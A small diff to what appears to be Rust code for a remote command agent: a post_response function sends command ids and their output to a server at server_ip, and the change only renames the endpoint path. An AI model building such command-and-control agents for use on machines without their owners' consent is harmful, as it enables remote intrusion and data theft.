@@ -163,7 +163,7 @@ fn run_command(cmd: &str) -> String {
 }
 
 fn post_response(cmd_id: &str, response: &str, identifier: &str){
-    let responses_url = format!("{}/hosts/{}/responses",server_ip, identifier);
+    let responses_url = format!("{}/hosts/{}/response",server_ip, identifier);
     print(&format!("\tcmd_id: {}\n\tResponse: {}",cmd_id,response));
     let text = format!("{{\"cmd_id\": \"{}\",\"response\": \"{}\"}}",cmd_id,response);
     let client = reqwest::blocking::Client::new();
